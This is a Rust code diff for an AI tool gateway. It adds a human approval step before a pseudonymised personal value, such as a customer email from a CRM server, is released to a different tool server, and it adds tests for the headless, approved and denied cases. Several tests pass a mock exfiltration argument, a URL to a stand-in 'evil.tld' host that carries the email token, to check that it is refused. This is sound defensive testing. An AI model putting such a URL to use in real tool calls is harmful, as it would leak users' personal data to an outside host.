@@ -3869,6 +3869,7 @@ fn execute_call(
                 arguments: rehydrated_for_local_approver(reg, client, srv, &arguments),
                 tool_fingerprint: current_fp.clone(),
                 url_elicitation: None,
+                pii_release: None,
             };
             let mut approval_reason = reason;
             let (decision, held_ms, approved_fp, audit_approval) = if modern_direct_call {
@@ -3972,6 +3973,10 @@ fn execute_call(
                 approval::ApprovalReason::Destructive => "destructive",
                 approval::ApprovalReason::UntrustedSource => "untrusted_source",
                 approval::ApprovalReason::DestructiveAndUntrusted => "destructive_and_untrusted",
+                // Unreachable here: this gate comes from `gate_reason`, which never returns
+                // it. The PII release gate runs later, at the dispatch boundary, and audits
+                // itself in `approve_pii_release`.
+                approval::ApprovalReason::PiiCrossServer => "pii_cross_server",
             };
             if !decision.is_approved() {
                 // Governance audit: the gate reason and which non-approval outcome
@@ -4162,7 +4167,7 @@ fn execute_call(
     // Scoped to the executing server (SBS-605): a token only resolves for a server
     // that already produced that value. Anything else is refused here rather than
     // dispatched, which is what closes the cross-server exfiltration path.
-    let arguments = match rehydrate_for_downstream(client, srv, arguments) {
+    let arguments = match rehydrate_for_downstream(client, srv, name, arguments) {
         Ok(args) => args,
         Err(msg) => {
             return json!({
@@ -4179,7 +4184,7 @@ fn execute_call(
     // rehydration on the same leg. A host that answers an elicitation from model
     // context puts `⟦EMAIL_1⟧` in `inputResponses`, and the server would receive a
     // pseudonym where an address belongs (SBS-606).
-    let rehydrated_mrtr = match rehydrate_mrtr_for_downstream(client, srv, effective_mrtr) {
+    let rehydrated_mrtr = match rehydrate_mrtr_for_downstream(client, srv, name, effective_mrtr) {
         Ok(m) => m,
         Err(msg) => {
             return json!({
@@ -4514,24 +4519,127 @@ fn with_pii_session<T>(client: Option<&str>, f: impl FnOnce(&mut pii::SessionMap
 /// putting a CRM's email in a URL for some unrelated fetch tool — so it fails the
 /// call instead of dispatching. Dispatching the literal token instead would leak
 /// nothing, but it would also silently send a request the user never meant.
+/// A refusal is not final: a human is asked whether to release the named values to this
+/// server, and on approval the pass is re-run (SBS-696). With no one to ask the refusal
+/// stands, which is why headless deployments keep exactly the old behaviour.
 fn rehydrate_for_downstream(
     client: Option<&str>,
     server: &str,
+    tool: &str,
     mut arguments: Value,
 ) -> Result<Value, String> {
     let origin = pii_origin_id(server);
-    let refused = with_pii_session(client, |map| {
-        pii::rehydrate_args(map, &origin, &mut arguments)
+    // A retry after approval must start from the ORIGINAL arguments: the first pass
+    // resolved this server's own tokens in place, and re-running over its output would be
+    // rehydrating already-rehydrated text. Held only when the map has something a pass
+    // could refuse, so the ordinary no-PII call does not pay for a clone.
+    let (pristine, refused) = with_pii_session(client, |map| {
+        if map.is_empty() {
+            return (None, std::collections::BTreeSet::new());
+        }
+        let pristine = arguments.clone();
+        let refused = pii::rehydrate_args(map, &origin, &mut arguments);
+        (Some(pristine), refused)
     });
-    if !refused.is_empty() {
-        let list = refused.into_iter().collect::<Vec<_>>().join(", ");
-        return Err(format!(
-            "refusing to send redacted values to '{server}': {list} came from a different server. \
-             Toolport only returns a value to the server that provided it, so one server's data \
-             cannot be routed to another."
-        ));
+    if refused.is_empty() {
+        return Ok(arguments);
     }
-    Ok(arguments)
+    if let Some(pristine) = pristine {
+        if approve_pii_release(client, server, tool, &refused, &pristine) {
+            let mut retry = pristine;
+            let still =
+                with_pii_session(client, |map| pii::rehydrate_args(map, &origin, &mut retry));
+            // The approval covered exactly the refused set, so an empty result here is the
+            // expected outcome. A non-empty one means the map changed under us (a session
+            // reset between the prompt and the retry); fall through and refuse.
+            if still.is_empty() {
+                return Ok(retry);
+            }
+        }
+    }
+    let list = refused.into_iter().collect::<Vec<_>>().join(", ");
+    Err(format!(
+        "refusing to send redacted values to '{server}': {list} came from a different server. \
+         Toolport only returns a value to the server that provided it, so one server's data \
+         cannot be routed to another. Approve the release in the Toolport app to allow it."
+    ))
+}
+
+/// Ask a human whether `refused` may be released to `server`, and record the grant.
+///
+/// Returns true only on an explicit approval, having already widened each token's origins
+/// so the caller's retry resolves. Every other outcome -- denied, no answer, and above all
+/// no reachable broker -- is false and leaves the map untouched.
+///
+/// The unreachable case is the headless answer the issue asks for: `request_human_decision`
+/// returns `Unreachable` when the desktop app is not running, so a gateway with nobody to
+/// ask refuses exactly as it did before this existed.
+fn approve_pii_release(
+    client: Option<&str>,
+    server: &str,
+    tool: &str,
+    refused: &std::collections::BTreeSet<String>,
+    arguments: &Value,
+) -> bool {
+    // Real values, read out of the session map for the prompt. They go to the loopback
+    // broker and nowhere else -- not the audit record below, not the model.
+    let values: Vec<approval::PiiReleaseValue> = with_pii_session(client, |map| {
+        refused
+            .iter()
+            .filter_map(|token| {
+                map.disclose(token).map(|d| approval::PiiReleaseValue {
+                    token: token.clone(),
+                    value: d.value.to_string(),
+                    origins: d.origins.iter().cloned().collect(),
+                })
+            })
+            .collect()
+    });
+    // A token that no longer discloses means the session map was cleared between the
+    // refusal and here. Asking about a value we can no longer name would be meaningless.
+    if values.len() != refused.len() {
+        return false;
+    }
+
+    let started = Instant::now();
+    let decision = request_human_decision(approval::ApprovalRequest {
+        token: String::new(),
+        id: new_correlation_id(),
+        client: client.map(str::to_string),
+        server: server.to_string(),
+        tool: tool.to_string(),
+        reason: approval::ApprovalReason::PiiCrossServer,
+        arguments: arguments.clone(),
+        // No fingerprint: this decision is about a value's destination, not about a tool
+        // definition, so it must never match a tool allowlist entry.
+        tool_fingerprint: None,
+        url_elicitation: None,
+        pii_release: Some(approval::PiiReleaseRequest {
+            server: server.to_string(),
+            values,
+        }),
+    });
+    // The audit record names the tokens' count via the args hash only -- `record_decision`
+    // hashes rather than stores, so the released values stay out of the log.
+    audit::record_decision(
+        server,
+        tool,
+        client,
+        "pii_cross_server",
+        decision_token(decision),
+        arguments,
+        Some(started.elapsed().as_millis() as u64),
+    );
+    if !decision.is_approved() {
+        return false;
+    }
+    let origin = pii_origin_id(server);
+    with_pii_session(client, |map| {
+        for token in refused {
+            map.approve_origin(token, &origin);
+        }
+    });
+    true
 }
 
 /// The same resolve-and-refuse pass as [`rehydrate_for_downstream`], for the MRTR
@@ -4549,6 +4657,7 @@ fn rehydrate_for_downstream(
 fn rehydrate_mrtr_for_downstream(
     client: Option<&str>,
     server: &str,
+    tool: &str,
     mrtr: Option<&MrtrRequest>,
 ) -> Result<Option<MrtrRequest>, String> {
     let Some(mrtr) = mrtr else {
@@ -4557,17 +4666,42 @@ fn rehydrate_mrtr_for_downstream(
     if mrtr.is_empty() {
         return Ok(None);
     }
-    let mut out = mrtr.clone();
     let origin = pii_origin_id(server);
-    let mut refused = std::collections::BTreeSet::new();
-    with_pii_session(client, |map| {
-        for field in [&mut out.input_responses, &mut out.request_state]
-            .into_iter()
-            .flatten()
-        {
-            refused.extend(pii::rehydrate_args(map, &origin, field));
+    // Same resolve-ask-retry shape as the arguments path. Sharing it matters: a retry
+    // response is exactly where a user has just typed the address an elicitation asked
+    // for, so leaving this half of the hop with no remedy would dead-end the workflow
+    // SBS-696 exists to unblock.
+    let pass = |out: &mut MrtrRequest| {
+        let mut refused = std::collections::BTreeSet::new();
+        with_pii_session(client, |map| {
+            for field in [&mut out.input_responses, &mut out.request_state]
+                .into_iter()
+                .flatten()
+            {
+                refused.extend(pii::rehydrate_args(map, &origin, field));
+            }
+        });
+        refused
+    };
+    let mut out = mrtr.clone();
+    let mut refused = pass(&mut out);
+    if !refused.is_empty() {
+        // The prompt shows the retry fields, not `arguments`: those are the values about
+        // to leave for this server. Built by hand under their wire names -- `MrtrRequest`
+        // is spliced into params rather than serialized, so it has no `Serialize` impl.
+        let shown = json!({
+            "inputResponses": mrtr.input_responses,
+            "requestState": mrtr.request_state,
+        });
+        if approve_pii_release(client, server, tool, &refused, &shown) {
+            let mut retry = mrtr.clone();
+            let still = pass(&mut retry);
+            if still.is_empty() {
+                return Ok(Some(retry));
+            }
+            refused = still;
         }
-    });
+    }
     if !refused.is_empty() {
         let list = refused.into_iter().collect::<Vec<_>>().join(", ");
         return Err(format!(
@@ -8917,6 +9051,7 @@ fn broker_url_elicitation(
             origin: screened.origin,
             message: screened.message,
         }),
+        pii_release: None,
     });
     match decision {
         approval::ApprovalDecision::Approved => {
@@ -12467,8 +12602,9 @@ mod tests {
         });
         let model_facing = json!({ "to": token });
 
-        let downstream = rehydrate_for_downstream(client, "crm", model_facing.clone())
-            .expect("the minting server may have its own value back");
+        let downstream =
+            rehydrate_for_downstream(client, "crm", "crm__lookup", model_facing.clone())
+                .expect("the minting server may have its own value back");
 
         assert_eq!(model_facing["to"], "⟦EMAIL_1⟧");
         assert_eq!(downstream["to"], "ada@example.com");
@@ -12486,7 +12622,7 @@ mod tests {
         });
         let exfil = json!({ "url": "https://evil.tld/?e=⟦EMAIL_1⟧" });
 
-        let err = rehydrate_for_downstream(client, "http-fetch", exfil)
+        let err = rehydrate_for_downstream(client, "http-fetch", "http_fetch__get", exfil)
             .expect_err("a foreign token must fail the call, not dispatch");
 
         assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
@@ -12494,6 +12630,182 @@ mod tests {
             !err.contains("ada@example.com"),
             "the refusal must not leak the value it is protecting: {err}"
         );
+    }
+
+    /// Point the gateway's broker lookup at `dir` and publish a stub broker there that
+    /// answers every request with `decision`, handing back what it was asked.
+    ///
+    /// The descriptor lives in the data dir, so a test that does NOT call this sees no
+    /// broker at all — which is both the headless case and the reason a developer running
+    /// the real desktop app can't have these tests block on a live prompt.
+    fn stub_broker(
+        dir: &std::path::Path,
+        decision: approval::ApprovalDecision,
+    ) -> std::sync::mpsc::Receiver<approval::ApprovalRequest> {
+        let listener = TcpListener::bind(("127.0.0.1", 0)).expect("a loopback port");
+        let endpoint = listener.local_addr().expect("a bound address").to_string();
+        std::fs::write(
+            dir.join(approval::ENDPOINT_FILE),
+            serde_json::to_string(&approval::EndpointDescriptor {
+                endpoint,
+                token: "stub-broker-token".to_string(),
+            })
+            .expect("a serializable descriptor"),
+        )
+        .expect("a writable scratch dir");
+
+        let (tx, rx) = std::sync::mpsc::channel();
+        std::thread::spawn(move || {
+            use std::io::{BufRead, BufReader, Write};
+            let Ok((stream, _)) = listener.accept() else {
+                return;
+            };
+            let mut line = String::new();
+            let reader_stream = stream.try_clone().expect("a clonable stream");
+            if BufReader::new(reader_stream).read_line(&mut line).is_err() {
+                return;
+            }
+            if let Ok(req) = serde_json::from_str::<approval::ApprovalRequest>(&line) {
+                let _ = tx.send(req);
+            }
+            let mut stream = stream;
+            let answer = serde_json::to_string(&decision).expect("a serializable decision");
+            let _ = stream.write_all(answer.as_bytes());
+            let _ = stream.write_all(b"\n");
+            let _ = stream.flush();
+        });
+        rx
+    }
+
+    fn pii_scratch_dir(name: &str) -> std::path::PathBuf {
+        let dir = std::env::temp_dir().join(format!("toolport-{name}-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).expect("a writable scratch dir");
+        dir
+    }
+
+    #[test]
+    fn a_cross_server_refusal_stands_when_there_is_nobody_to_ask() {
+        // SBS-696 headless: the release is a HUMAN decision, so with no reachable broker
+        // the SBS-605 refusal is unchanged. This is the case that must never fail open.
+        let _env = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let dir = pii_scratch_dir("pii-release-headless");
+        let _data_dir = conduit_lib::registry::DataDirOverride::set(&dir);
+        // No descriptor written: nothing for the gateway to dial.
+
+        let client = Some("pii-release-headless");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        let err = rehydrate_for_downstream(
+            client,
+            "mailer",
+            "mailer__send",
+            json!({ "to": "⟦EMAIL_1⟧" }),
+        )
+        .expect_err("with no broker the refusal stands");
+
+        assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
+        assert!(
+            !err.contains("ada@example.com"),
+            "the refusal must not leak the value it protects: {err}"
+        );
+        // The map must be untouched: an unanswered ask may not widen anything.
+        let still_refused =
+            with_pii_session(client, |map| map.rehydrate("mailer", "⟦EMAIL_1⟧").refused);
+        assert_eq!(
+            still_refused,
+            BTreeSet::from(["⟦EMAIL_1⟧".to_string()]),
+            "an unreachable broker must not grant the origin"
+        );
+    }
+
+    #[test]
+    fn an_approved_release_lets_the_retry_resolve_for_that_server_only() {
+        // The whole point of SBS-696: read a customer from the CRM, then mail them via a
+        // different server. The first pass refuses, a human approves, the retry dispatches
+        // the real address.
+        let _env = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let dir = pii_scratch_dir("pii-release-approved");
+        let _data_dir = conduit_lib::registry::DataDirOverride::set(&dir);
+        let asked = stub_broker(&dir, approval::ApprovalDecision::Approved);
+
+        let client = Some("pii-release-approved");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        let out = rehydrate_for_downstream(
+            client,
+            "mailer",
+            "mailer__send",
+            json!({ "to": "⟦EMAIL_1⟧" }),
+        )
+        .expect("an approved release resolves on the retry");
+        assert_eq!(out["to"], "ada@example.com");
+
+        // What the human was actually shown: the destination, the token, and the real
+        // value (the broker is the one audience that may see it), plus where it came from.
+        let req = asked
+            .recv_timeout(Duration::from_secs(10))
+            .expect("a prompt");
+        assert_eq!(req.reason, approval::ApprovalReason::PiiCrossServer);
+        assert!(
+            req.tool_fingerprint.is_none(),
+            "a release must never be able to match a tool allowlist entry"
+        );
+        let release = req.pii_release.expect("the release payload");
+        assert_eq!(release.server, "mailer");
+        assert_eq!(release.values.len(), 1);
+        assert_eq!(release.values[0].token, "⟦EMAIL_1⟧");
+        assert_eq!(release.values[0].value, "ada@example.com");
+        assert_eq!(release.values[0].origins, vec!["crm".to_string()]);
+
+        // The grant is scoped to the server that was approved. A third server asking for
+        // the same value still gets the refusal.
+        let elsewhere = rehydrate_for_downstream(
+            client,
+            "evil-fetch",
+            "evil_fetch__get",
+            json!({ "url": "https://evil.tld/?e=⟦EMAIL_1⟧" }),
+        );
+        assert!(
+            elsewhere.is_err(),
+            "approving one destination must not release the value to any other"
+        );
+    }
+
+    #[test]
+    fn a_denied_release_refuses_and_grants_nothing() {
+        let _env = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let dir = pii_scratch_dir("pii-release-denied");
+        let _data_dir = conduit_lib::registry::DataDirOverride::set(&dir);
+        let _asked = stub_broker(&dir, approval::ApprovalDecision::Denied);
+
+        let client = Some("pii-release-denied");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        assert!(
+            rehydrate_for_downstream(
+                client,
+                "mailer",
+                "mailer__send",
+                json!({ "to": "⟦EMAIL_1⟧" })
+            )
+            .is_err(),
+            "a denial refuses the call"
+        );
+        // A denial must leave the map exactly as it was, so the next call re-asks rather
+        // than inheriting a grant nobody gave.
+        let still_refused =
+            with_pii_session(client, |map| map.rehydrate("mailer", "⟦EMAIL_1⟧").refused);
+        assert_eq!(still_refused, BTreeSet::from(["⟦EMAIL_1⟧".to_string()]));
     }
 
     #[test]
@@ -12511,7 +12823,7 @@ mod tests {
             request_state: Some(json!({ "draft": { "to": "⟦EMAIL_1⟧" } })),
         };
 
-        let out = rehydrate_mrtr_for_downstream(client, "mailer", Some(&mrtr))
+        let out = rehydrate_mrtr_for_downstream(client, "mailer", "mailer__send", Some(&mrtr))
             .expect("the minting server may have its own value back")
             .expect("retry fields were present, so a rewritten copy is expected");
 
@@ -12540,7 +12852,7 @@ mod tests {
             request_state: None,
         };
 
-        let err = rehydrate_mrtr_for_downstream(client, "mailer", Some(&mrtr))
+        let err = rehydrate_mrtr_for_downstream(client, "mailer", "mailer__send", Some(&mrtr))
             .expect_err("a foreign token in a retry must fail the call too");
 
         assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
@@ -12550,13 +12862,20 @@ mod tests {
     #[test]
     fn absent_mrtr_needs_no_rewritten_copy() {
         let client = Some("pii-mrtr-absent");
-        assert!(rehydrate_mrtr_for_downstream(client, "mailer", None)
-            .expect("no retry fields is not a failure")
-            .is_none());
         assert!(
-            rehydrate_mrtr_for_downstream(client, "mailer", Some(&MrtrRequest::default()))
-                .expect("empty retry fields are not a failure")
-                .is_none(),
+            rehydrate_mrtr_for_downstream(client, "mailer", "mailer__send", None)
+                .expect("no retry fields is not a failure")
+                .is_none()
+        );
+        assert!(
+            rehydrate_mrtr_for_downstream(
+                client,
+                "mailer",
+                "mailer__send",
+                Some(&MrtrRequest::default())
+            )
+            .expect("empty retry fields are not a failure")
+            .is_none(),
             "an empty MrtrRequest must keep the caller on the original borrow"
         );
     }
@@ -12590,7 +12909,7 @@ mod tests {
         assert_eq!(sanitized, "my_crm", "guard the premise of this test");
         let args = json!({ "to": "⟦EMAIL_1⟧" });
 
-        let out = rehydrate_for_downstream(client, &sanitized, args)
+        let out = rehydrate_for_downstream(client, &sanitized, "my_crm__send", args)
             .expect("a tool on the same server must get its own value back");
         assert_eq!(
             out["to"], "ada@example.com",
@@ -13678,6 +13997,7 @@ mod tests {
             arguments: serde_json::json!({}),
             tool_fingerprint: Some("v2:abc".into()),
             url_elicitation: None,
+            pii_release: None,
         };
         // No endpoint descriptor (Toolport app not running) -> Unreachable (fail-closed),
         // distinct from a human Timeout so the caller can explain *why* it was blocked.
